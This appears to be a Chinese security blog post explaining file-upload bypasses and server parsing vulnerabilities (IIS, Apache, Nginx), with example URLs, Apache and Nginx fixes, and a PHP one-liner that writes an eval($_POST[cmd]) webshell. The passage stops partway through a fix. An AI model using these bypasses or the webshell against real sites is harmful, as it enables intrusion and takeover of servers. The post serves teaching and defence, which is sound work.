@@ -1,0 +1,1167 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="Web安全,上传解析漏洞,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="上传解析相关 https://thief.one/%2F2016%2F09%2F22%2F%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85%2F  01-简介 文件上传 常识：文件后缀必须同文件代码保持一致 解析漏洞原因及条件：w">
+<meta name="keywords" content="Web安全,上传解析漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="上传及解析漏洞">
+<meta property="og:url" content="http://21guns.top/2018/01/22/上传及解析漏洞/index.html">
+<meta property="og:site_name" content="Ry1ynn&#39;s blogs">
+<meta property="og:description" content="上传解析相关 https://thief.one/%2F2016%2F09%2F22%2F%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85%2F  01-简介 文件上传 常识：文件后缀必须同文件代码保持一致 解析漏洞原因及条件：w">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-02-18T07:39:28.689Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="上传及解析漏洞">
+<meta name="twitter:description" content="上传解析相关 https://thief.one/%2F2016%2F09%2F22%2F%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85%2F  01-简介 文件上传 常识：文件后缀必须同文件代码保持一致 解析漏洞原因及条件：w">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://21guns.top/2018/01/22/上传及解析漏洞/">
+
+
+
+
+
+  <title>上传及解析漏洞 | Ry1ynn's blogs</title>
+  
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ry1ynn's blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://21guns.top/2018/01/22/上传及解析漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ry1ynn">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ry1ynn's blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">上传及解析漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-22T15:06:56+08:00">
+                2018-01-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全基础/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全基础</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="上传解析相关"><a href="#上传解析相关" class="headerlink" title="上传解析相关"></a>上传解析相关</h1><blockquote>
+<p><a href="https://thief.one/%2F2016%2F09%2F22%2F%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85%2F" target="_blank" rel="noopener">https://thief.one/%2F2016%2F09%2F22%2F%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85%2F</a></p>
+</blockquote>
+<h2 id="01-简介"><a href="#01-简介" class="headerlink" title="01-简介"></a>01-简介</h2><ul>
+<li>文件上传<ul>
+<li>常识：文件后缀必须同文件代码保持一致</li>
+<li>解析漏洞原因及条件：web搭建平台相关</li>
+<li>IIS,Apache,Nginx</li>
+<li>以其他格式后缀执行出后门格式效果</li>
+</ul>
+</li>
+</ul>
+<a id="more"></a>
+<ul>
+<li>IIS6.0 <ul>
+<li>文件类型<ul>
+<li>正常：<a href="http://www.xxx.com/logo.jpg" target="_blank" rel="noopener">www.xxx.com/logo.jpg</a></li>
+<li>触发漏洞：<a href="http://www.xxx.com/logo.asp;.jpg" target="_blank" rel="noopener">www.xxx.com/logo.asp;.jpg</a></li>
+</ul>
+</li>
+<li>文件夹类型<ul>
+<li>正常：<a href="http://www.xxx.com/image/qq.jpg" target="_blank" rel="noopener">www.xxx.com/image/qq.jpg</a></li>
+<li>触发漏洞：<a href="http://www.xxx.com/image.asp/qq.jpg" target="_blank" rel="noopener">www.xxx.com/image.asp/qq.jpg</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Iis7.x uginx<ul>
+<li>正常：<a href="http://www.xxx.com/qq.jpg" target="_blank" rel="noopener">www.xxx.com/qq.jpg</a></li>
+<li>有漏洞：<a href="http://www.xx.com/qq.jpg/*.php" target="_blank" rel="noopener">www.xx.com/qq.jpg/*.php</a></li>
+<li>备注：存在漏洞，即文件被当作php程序解析</li>
+</ul>
+</li>
+<li>Apache低版本<ul>
+<li>正常：<a href="http://www.xxx.com/qq.jpg" target="_blank" rel="noopener">www.xxx.com/qq.jpg</a></li>
+<li>有漏洞：<a href="http://www.xxx.com/qq.php.xxxx" target="_blank" rel="noopener">www.xxx.com/qq.php.xxxx</a></li>
+<li>备注：存在漏洞，向上逐次解析</li>
+</ul>
+</li>
+<li>获取网站的搭建平台<ul>
+<li>推荐方法：直接通过网站浏览器自带的审查元素功能监听数据包获取</li>
+<li>浏览器F12</li>
+<li>响应包Server字段</li>
+</ul>
+</li>
+<li>思考解析漏洞利用场景<br>后台或其他应用上传文件时，情况如下：<ul>
+<li>客户端和服务端命名一致</li>
+<li>客户端和服务端命名不一致（时间，随机等）</li>
+</ul>
+</li>
+</ul>
+<h2 id="02-文件上传校验姿势"><a href="#02-文件上传校验姿势" class="headerlink" title="02-文件上传校验姿势"></a>02-文件上传校验姿势</h2><ul>
+<li>客户端javascript校验（一般只校验后缀名</li>
+<li>服务端校验<ul>
+<li>文件头content-type字段校验（image/gif）</li>
+<li>文件内容头校验（GIF89a）</li>
+<li>后缀名黑名单校验</li>
+<li>后缀名白名单校验</li>
+<li>自定义正则校验</li>
+</ul>
+</li>
+<li>WAF设备校验（根据不同的WAF产品而定）</li>
+</ul>
+<h3 id="2-1-客户端校验"><a href="#2-1-客户端校验" class="headerlink" title="2.1-客户端校验"></a>2.1-客户端校验</h3><ul>
+<li>一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。</li>
+<li>判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</li>
+</ul>
+<h3 id="2-2-服务端校验"><a href="#2-2-服务端校验" class="headerlink" title="2.2-服务端校验"></a>2.2-服务端校验</h3><ul>
+<li><p>content-type字段校验</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>($_FILES[<span class="string">'userfile'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>)  </span><br><span class="line">    <span class="comment">#这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。</span></span><br><span class="line">    &#123;   </span><br><span class="line">     	<span class="keyword">echo</span> <span class="string">"Sorry, we only allow uploading GIF images"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $uploaddir = <span class="string">'uploads/'</span>;</span><br><span class="line">    $uploadfile = $uploaddir . basename($_FILES[<span class="string">'userfile'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'userfile'</span>][<span class="string">'tmp_name'</span>], $uploadfile))</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误</li>
+<li>通过检验<code>$_FILES[&#39;userfile&#39;][&#39;type&#39;]</code>的type字段；</li>
+</ul>
+</li>
+<li><p>通过检验<code>$_FILES[&#39;userfile&#39;][&#39;type&#39;]</code>的type字段；</p>
+<p>可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系</p>
+<ul>
+<li>.JPEG;.JPE;.JPG，”JPGGraphic File”</li>
+<li>.gif，”GIF 89A”</li>
+<li>.zip，”Zip Compressed”</li>
+<li>.doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</li>
+</ul>
+</li>
+</ul>
+<h2 id="03-文件上传绕过校验"><a href="#03-文件上传绕过校验" class="headerlink" title="03-文件上传绕过校验"></a>03-文件上传绕过校验</h2><ul>
+<li>客户端绕过（抓包改包）</li>
+<li><p>服务端绕过</p>
+</li>
+<li><ul>
+<li>文件类型</li>
+<li>文件头</li>
+<li>文件后缀名</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>配合文件包含漏洞绕过</li>
+<li>配合服务器解析漏洞绕过</li>
+<li>CMS、编辑器漏洞绕过</li>
+<li>配合操作系统文件命名规则绕过</li>
+<li>配合其他规则绕过</li>
+<li>WAF绕过</li>
+</ul>
+<h3 id="3-1-客户端绕过"><a href="#3-1-客户端绕过" class="headerlink" title="3.1-客户端绕过"></a>3.1-客户端绕过</h3><ul>
+<li>可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</li>
+</ul>
+<h3 id="3-2-服务端绕过"><a href="#3-2-服务端绕过" class="headerlink" title="3.2-服务端绕过"></a>3.2-服务端绕过</h3><ul>
+<li><p>文件类型绕过</p>
+<ul>
+<li>我们可以通过抓包，将content-type字段改为image/gif</li>
+<li>content-type字段</li>
+</ul>
+</li>
+<li><p>文件头绕过</p>
+<ul>
+<li>在木马内容基础上再加了一些文件信息，有点像下面的结构<br><code>GIF89a&lt;?php phpinfo(); ?&gt;</code></li>
+<li>添加文件头</li>
+</ul>
+</li>
+<li><p>文件后缀名绕过</p>
+<ul>
+<li><p>前提：黑名单校验（黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件)</p>
+</li>
+<li><p>绕过方法：</p>
+<ul>
+<li>找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类</li>
+<li>可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类</li>
+</ul>
+</li>
+<li><p>能被解析的文件扩展名列表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jsp jspx jspf</span><br><span class="line">asp asa cer aspx</span><br><span class="line">php php php3 php4</span><br><span class="line">exe exee</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-3-配合文件包含漏洞"><a href="#3-3-配合文件包含漏洞" class="headerlink" title="3.3-配合文件包含漏洞"></a>3.3-配合文件包含漏洞</h3><ul>
+<li><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。</p>
+</li>
+<li><p>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）</p>
+<ul>
+<li><p>先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容</p>
+</li>
+<li><p>然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt;</p>
+</li>
+<li><p>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#PHP    </span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">Include</span>(<span class="string">"上传的txt文件路径"</span>);<span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">#ASP    </span></span><br><span class="line">&lt;!--<span class="comment">#include file="上传的txt文件路径" --&gt;</span></span><br><span class="line"><span class="comment">#JSP    </span></span><br><span class="line">&lt;jsp:inclde page=<span class="string">"上传的txt文件路径"</span>/&gt;</span><br><span class="line"><span class="keyword">or</span>  </span><br><span class="line">&lt;%@<span class="keyword">include</span> file=<span class="string">"上传的txt文件路径"</span>%&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这个php文件可看做是一个存在文件包含漏洞的文件的代表；</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-4-配合服务器解析漏洞"><a href="#3-4-配合服务器解析漏洞" class="headerlink" title="3.4-配合服务器解析漏洞"></a>3.4-配合服务器解析漏洞</h3><h4 id="3-4-1-IIS5-x-6-x"><a href="#3-4-1-IIS5-x-6-x" class="headerlink" title="3.4.1-IIS5.x-6.x"></a>3.4.1-IIS5.x-6.x</h4><ul>
+<li><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>
+</li>
+<li><p>目录解析(6.0)</p>
+<ul>
+<li>形式：<a href="http://www.xxx.com/xx.asp/xx.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp/xx.jpg</a></li>
+<li>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。</li>
+</ul>
+</li>
+<li><p>文件解析</p>
+<ul>
+<li>形式：<a href="http://www.xxx.com/xx.asp;.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp;.jpg</a></li>
+<li>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</li>
+</ul>
+</li>
+<li><p>解析文件类型</p>
+<p>IIS6.0 默认的可执行文件除了asp还包含这三种 :</p>
+<ul>
+<li>/test.asa</li>
+<li>/test.cer</li>
+<li>/test.cdx</li>
+</ul>
+</li>
+<li><p>修复方案</p>
+<ul>
+<li>目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传xx.asp;.jpg类型的文件名</li>
+<li>做好权限设置，限制用户创建文件夹。</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-4-2-apache"><a href="#3-4-2-apache" class="headerlink" title="3.4.2-apache"></a>3.4.2-apache</h4><ul>
+<li><p>漏洞原理</p>
+<ul>
+<li>Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。</li>
+<li>比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</li>
+<li>注意<ul>
+<li>同时以module方式使apache与php结合，测试发现确实存在这样的解析漏洞。；</li>
+<li>将apache与php的结合方式修改为fastcgi方式，测试发现爆500错误，不存在这样的解析漏洞。</li>
+<li>详情：<a href="http://www.cnblogs.com/milantgh/p/5116955.html" target="_blank" rel="noopener">http://www.cnblogs.com/milantgh/p/5116955.html</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>漏洞形式</p>
+<p><code>www.xxxx.xxx.com/test.php.php123</code></p>
+<ul>
+<li>原来文件后缀就是.php123，就是说此文件test.php.php123真实存在于服务器，而不是现访问浏览器构造的url；</li>
+<li>大体就是这样，但是phpstudy或腾讯云apache测试时，并没有此解析漏洞，php代码为文本形式显示；</li>
+<li>docker中测试成功，2.php.php123.php345内容为phpinfo();按照这种后缀，能当php解析；</li>
+</ul>
+</li>
+<li><p>尝试修复</p>
+<ul>
+<li><p>方法1，</p>
+<ul>
+<li><p>apache配置文件，禁止.php.这样的文件执行</p>
+</li>
+<li><p>配置文件里面加入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ “.(php.|php3.)”&gt;</span><br><span class="line">        Order Allow,Deny</span><br><span class="line">        Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后重启，service httpd restart</p>
+</li>
+</ul>
+</li>
+<li><p>方法2：</p>
+<ul>
+<li><p>伪静态方法（先撤销上面方法1的修改）</p>
+<ul>
+<li><p>首先apache要开启htaccess的使用<a href="http://www.jb51.net/article/25476.htm" target="_blank" rel="noopener">http://www.jb51.net/article/25476.htm</a></p>
+</li>
+<li><p>修改配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">将:（&lt;/Directory &quot;/var/www/html&quot;&gt;中的）</span><br><span class="line">Options FollowSymLinks</span><br><span class="line">AllowOverride None</span><br><span class="line"></span><br><span class="line">改为</span><br><span class="line">Options FollowSymLinks</span><br><span class="line">AllowOverride All</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>最后，修补成功，自动跳转到主页</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>其余配置问题导致漏洞</p>
+<ul>
+<li><p>如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行</p>
+</li>
+<li><p>如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行</p>
+</li>
+<li><p>修复方案</p>
+<ul>
+<li><p>apache配置文件，禁止.php.这样的文件执行，配置文件里面加入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ “.(php.|php3.)”&gt;</span><br><span class="line">        Order Allow,Deny</span><br><span class="line">        Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>（首先开启.htaccess，见上面修补方法2）用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so<br>把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteRule .(php.|php3.) /index.php</span><br><span class="line">RewriteRule .(pHp.|pHp3.) /index.php</span><br><span class="line">RewriteRule .(phP.|phP3.) /index.php</span><br><span class="line">RewriteRule .(Php.|Php3.) /index.php</span><br><span class="line">RewriteRule .(PHp.|PHp3.) /index.php</span><br><span class="line">RewriteRule .(PhP.|PhP3.) /index.php</span><br><span class="line">RewriteRule .(pHP.|pHP3.) /index.php</span><br><span class="line">RewriteRule .(PHP.|PHP3.) /index.php</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-4-2-nginx解析漏洞"><a href="#2-4-2-nginx解析漏洞" class="headerlink" title="2.4.2-nginx解析漏洞"></a>2.4.2-nginx解析漏洞</h4><ul>
+<li><p>简介</p>
+<ul>
+<li><p>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。</p>
+</li>
+<li><p>当访问<a href="http://www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP" target="_blank" rel="noopener">www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP</a> CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。</p>
+</li>
+<li><p>如果开启了这个选项，那么就会触发在PHP中的如下逻辑</p>
+</li>
+<li><p>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">——www.xx.com/phpinfo.jpg/1.php这个URL时；</span><br><span class="line">——$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”；</span><br><span class="line">——开启fix_pathinfo这个选项</span><br><span class="line">——SCRIPT_FILENAME是phpinfo.jpg；</span><br><span class="line">——1.php是PATH_INFO</span><br><span class="line">——phpinfo.jpg作为PHP文件来解析了</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>测试：</p>
+<ul>
+<li><p>2.jpg文件，内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>结果</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">访问：http://127.0.0.1/test/2.jpg</span><br><span class="line">错误</span><br><span class="line"></span><br><span class="line">访问：http://127.0.0.1/test/2.jpg/1.php</span><br><span class="line">正常</span><br><span class="line"></span><br><span class="line">访问：http://127.0.0.1/test/2.jpg/dcc.php1111</span><br><span class="line">正常；</span><br><span class="line"></span><br><span class="line">访问：http://127.0.0.1/test/2.jpg/dcc.ph1p1111</span><br><span class="line">错误；</span><br><span class="line"></span><br><span class="line">访问：http://127.0.0.1/test/2.jpg/dcc.jpgphp</span><br><span class="line">错误；</span><br><span class="line"></span><br><span class="line">访问：http://127.0.0.1/test/2.jpg/dcc.jpg.php</span><br><span class="line">正常；</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>小结：</p>
+<ul>
+<li>/后面必须含有字符串“.php”；</li>
+<li>/1.jpg%00.php，这样会失败；</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>漏洞形式</p>
+<ul>
+<li><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/1.php（成功）" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg/1.php（成功）</a></li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><a href="http://www.xxxx.com/UploadFiles/image/1.jpg%00.php（失败）" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg%00.php（失败）</a></li>
+<li><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php（成功）" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php（成功）</a></li>
+</ul>
+<ul>
+<li><p>另一种姿势</p>
+<ul>
+<li><p>上传一个名字为test.jpg，以下内容的文件。</p>
+<p>·<code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></p>
+</li>
+<li><p>然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php</p>
+</li>
+<li><p>修复</p>
+<ul>
+<li><p>修改php.ini文件，将cgi.fix_pathinfo的值设置为0;</p>
+</li>
+<li><p>在Nginx配置文件中添加以下代码：</p>
